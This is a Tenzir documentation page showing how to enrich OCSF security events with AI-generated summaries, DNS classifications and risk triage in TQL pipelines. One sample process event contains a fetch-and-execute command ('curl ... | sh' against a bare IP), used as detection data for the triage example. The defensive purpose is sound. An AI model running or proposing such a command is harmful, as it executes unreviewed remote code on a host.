---
title: "Enrich events with AI"
description: "Add AI-generated summaries and labels to OCSF events in Tenzir pipelines"
canonical: https://tenzir.com/docs/guides/enrich/enrich-events-with-ai
source: https://tenzir.com/docs/guides/enrich/enrich-events-with-ai.md
section: "Docs"
---

# Enrich events with AI

> Add AI-generated summaries and labels to OCSF events in Tenzir pipelines

This guide shows you how to enrich OCSF events with AI-generated summaries, classifications, and annotations by using [`ai_prompt`](https://tenzir.com/docs/reference/operators/ai_prompt.md), and how to triage events cheaply with typed decisions from [`ai_decide`](https://tenzir.com/docs/reference/operators/ai_decide.md).

The [`ai_prompt`](https://tenzir.com/docs/reference/operators/ai_prompt.md) operator sends one request per input event to an OpenAI-compatible Responses API endpoint. Use it when a deterministic rule or lookup table is too rigid, and keep the prompt payload small and explicit. The examples use compact OCSF-style records as `from {...}` starting points so you can focus on the enrichment pattern.

OCSF events have an `enrichments` field for inline enrichment data associated with an event or finding. The examples write the model result to a temporary field, use [`add`](https://tenzir.com/docs/reference/functions/add.md) to add an OCSF `enrichment` object to `enrichments`, and then remove the temporary field.

## Summarize a detection finding

Use `data` to send only the fields that the model needs. This example enriches an OCSF `detection_finding` event with a one-sentence summary and adds it to the event’s `enrichments` field:

```tql
from {
  time: 2024-08-22T09:12:34,
  category_uid: 2,
  class_uid: 2004,
  activity_id: 1,
  activity_name: "Create",
  type_uid: 200401,
  severity_id: 4,
  message: "Suspicious PowerShell command downloaded a script from a newly registered domain.",
  metadata: {
    version: "1.9.0",
  },
  finding_info: {
    uid: "finding-42",
    title: "Suspicious PowerShell download",
    desc: "PowerShell used a hidden window to download and execute a remote script.",
  },
  enrichments: [],
  confidence_id: 3,
  confidence: "High",
}
ai_prompt model="qwen3.8",
           system="Summarize this OCSF detection finding in one sentence for a security analyst.",
           data={
             severity_id: severity_id,
             confidence: confidence,
             message: message,
             finding: finding_info,
           },
           into=ai.summary
where ai.summary != null
enrichments = enrichments.add({
  name: "finding_info.uid",
  value: finding_info.uid,
  type: "ai_summary",
  provider: "Tenzir ai_prompt",
  short_desc: ai.summary.text,
  src_url: "http://127.0.0.1:11434/v1/responses",
  created_time: now(),
  data: {
    text: ai.summary.text,
    model: ai.summary.model,
    usage: ai.summary.usage,
    latency_ms: ai.summary.latency / 1ms,
  },
})
drop ai
```

The default endpoint is `http://127.0.0.1:11434/v1`, which matches the standard Ollama OpenAI-compatible API port. The example works with a local model if Ollama is running and the `qwen3.8` model is available.

## Classify DNS activity

For fields that you want to use later in a pipeline, ask for a compact answer. The operator stores the model response as text and doesn’t parse JSON-looking output into structured fields.

This example classifies an OCSF `dns_activity` event. It sends the DNS query, response, and endpoints instead of the entire event:

```tql
from {
  time: 2024-08-22T09:13:01,
  category_uid: 4,
  class_uid: 4003,
  activity_id: 2,
  activity_name: "Response",
  type_uid: 400302,
  severity_id: 1,
  message: "DNS response for suspicious-update.example resolved to 198.51.100.42.",
  metadata: {
    version: "1.9.0",
  },
  query: {
    hostname: "suspicious-update.example",
  },
  rcode_id: 0,
  rcode: "NoError",
  src_endpoint: {
    ip: 10.10.2.17,
    port: 54213,
    hostname: "workstation-17",
  },
  dst_endpoint: {
    ip: 192.0.2.53,
    port: 53,
    hostname: "resolver-1",
  },
  answers: [{
    rdata: "198.51.100.42",
    type: "A",
    ttl: 60,
  }],
  enrichments: [],
}
ai_prompt model="qwen3.8",
           system="Classify this OCSF DNS event as benign, suspicious, or malicious. Reply with one label and a short reason.",
           data={
             query: query.hostname,
             rcode: rcode,
             answers: answers,
             src_endpoint: src_endpoint,
             dst_endpoint: dst_endpoint,
           },
           into=ai.classification,
           timeout=10s,
           concurrency=4
where ai.classification != null
enrichments = enrichments.add({
  name: "query.hostname",
  value: query.hostname,
  type: "ai_classification",
  provider: "Tenzir ai_prompt",
  short_desc: ai.classification.text,
  src_url: "http://127.0.0.1:11434/v1/responses",
  created_time: now(),
  data: {
    text: ai.classification.text,
    model: ai.classification.model,
    usage: ai.classification.usage,
    latency_ms: ai.classification.latency / 1ms,
  },
})
drop ai
```

Use `concurrency` to control how many requests can run at the same time. Keep the value low until you understand your provider’s rate limits and your model latency.

## Triage with typed decisions first

A language model is slow and expensive to call for every event. A **decision model** answers typed questions instead: a yes/no probability, one option out of a fixed set, or a score on an ordered scale. The [`ai_decide`](https://tenzir.com/docs/reference/operators/ai_decide.md) operator asks such questions of hosted Jev, Cloudflare’s Clef on Workers AI, the OpenAI Decisions API, or a local Laya server, and you choose the provider with the `endpoint`. Use it as a first tier that filters events, and send only the remaining events to [`ai_prompt`](https://tenzir.com/docs/reference/operators/ai_prompt.md).

This example rates the command of an OCSF `process_activity` event on a three-level scale. Levels start at 0, so a score of at least 1.5 means that the model leans toward the highest level. Only risky commands reach the language model:

```tql
from {
  time: 2024-08-22T09:15:42,
  category_uid: 1,
  class_uid: 1007,
  activity_id: 1,
  activity_name: "Launch",
  type_uid: 100701,
  severity_id: 1,
  metadata: {
    version: "1.9.0",
  },
  process: {
    cmd_line: "curl -s https://203.0.113.7/x.sh | sh",
    user: {
      name: "build",
    },
  },
  enrichments: [],
}
ai_decide "How risky is this command for the host?",
          scale=["Routine administration", "Unusual but plausible",
                 "Likely malicious or destructive"],
          state={cmd_line: process.cmd_line, user: process.user.name},
          model="jev-latest",
          endpoint="https://api.typesafe.ai/v1",
          api_key=secret("typesafe-api-key")
where ai.decide.answer.score >= 1.5
ai_prompt model="qwen3.8",
          system="Explain in one sentence why this command is risky.",
          data={cmd_line: process.cmd_line, user: process.user.name},
          into=ai.explanation
where ai.explanation != null
enrichments = enrichments.add({
  name: "process.cmd_line",
  value: process.cmd_line,
  type: "ai_risk",
  provider: "Tenzir ai_decide",
  short_desc: ai.explanation.text,
  created_time: now(),
  data: {
    risk_score: ai.decide.answer.score,
    explanation: ai.explanation.text,
  },
})
drop ai
```

The decision model rates the command close to the highest level, and the language model explains why:

```tql
{
  time: 2024-08-22T09:15:42Z,
  category_uid: 1,
  class_uid: 1007,
  activity_id: 1,
  activity_name: "Launch",
  type_uid: 100701,
  severity_id: 1,
  metadata: {
    version: "1.9.0",
  },
  process: {
    cmd_line: "curl -s https://203.0.113.7/x.sh | sh",
    user: {
      name: "build",
    },
  },
  enrichments: [
    {
      name: "process.cmd_line",
      value: "curl -s https://203.0.113.7/x.sh | sh",
      type: "ai_risk",
      provider: "Tenzir ai_decide",
      short_desc: "The command downloads a script from a bare IP address and pipes it straight into a shell, so it runs unreviewed remote code.",
      created_time: 2024-08-22T09:15:44.218312Z,
      data: {
        risk_score: 1.99,
        explanation: "The command downloads a script from a bare IP address and pipes it straight into a shell, so it runs unreviewed remote code.",
      },
    },
  ],
}
```

Both operators write their results below the `ai` field, and neither sends the `ai` field to the model by default. The language model therefore sees the event, not the earlier decision. Pass the decision in `data` if the explanation should take it into account.

## Use a hosted endpoint

To use a hosted OpenAI-compatible endpoint, set `endpoint` and `api_key`. Both arguments are resolved as secrets, so you can keep provider details out of the pipeline text:

```tql
from {
  time: 2024-08-22T09:14:10,
  category_uid: 2,
  class_uid: 2004,
  activity_id: 2,
  activity_name: "Update",
  type_uid: 200402,
  severity_id: 3,
  message: "Detection confidence increased after related network activity.",
  metadata: {
    version: "1.9.0",
  },
  finding_info: {
    uid: "finding-43",
    title: "Suspicious domain contact",
    desc: "A workstation contacted a domain that appeared in a related DNS activity event.",
  },
  enrichments: [],
  confidence_id: 2,
  confidence: "Medium",
}
ai_prompt model="gpt-4.1-mini",
           endpoint=secret("openai-endpoint"),
           api_key=secret("openai-api-key"),
           system="Suggest one next investigation step for this OCSF finding.",
           data={
             severity_id: severity_id,
             confidence: confidence,
             message: message,
             finding: finding_info,
           },
           into=ai.next_step
where ai.next_step != null
enrichments = enrichments.add({
  name: "finding_info.uid",
  value: finding_info.uid,
  type: "ai_next_step",
  provider: "Tenzir ai_prompt",
  short_desc: ai.next_step.text,
  src_url: "https://api.openai.com/v1/responses",
  created_time: now(),
  data: {
    text: ai.next_step.text,
    model: ai.next_step.model,
    usage: ai.next_step.usage,
    latency_ms: ai.next_step.latency / 1ms,
  },
})
drop ai
```

## Handle request failures

If a request fails, Tenzir keeps the input event and writes `null` to the temporary result field. Filter or route failed enrichments before you add an OCSF `enrichment` object:

```tql
where ai.next_step != null
```

The [`ai_decide`](https://tenzir.com/docs/reference/operators/ai_decide.md) operator also writes `null` when a request fails, and an answer is `null` when the model refuses the question. For triage, decide whether a failure should hide or surface an event. To fail open and keep events that the model couldn’t assess, test the answer for `null` first:

```tql
where ai.decide.answer? == null or ai.decide.answer.score >= 1.5
```

Model calls can send sensitive event data to another process or service. Prefer `data={...}` over sending the whole event, omit fields that aren’t needed for the task, and use secrets for endpoint URLs and API keys.

## See Also

* [Enrich with threat intel](enrich-with-threat-intel.md)
* [Enrich with asset inventory](enrich-with-asset-inventory.md)
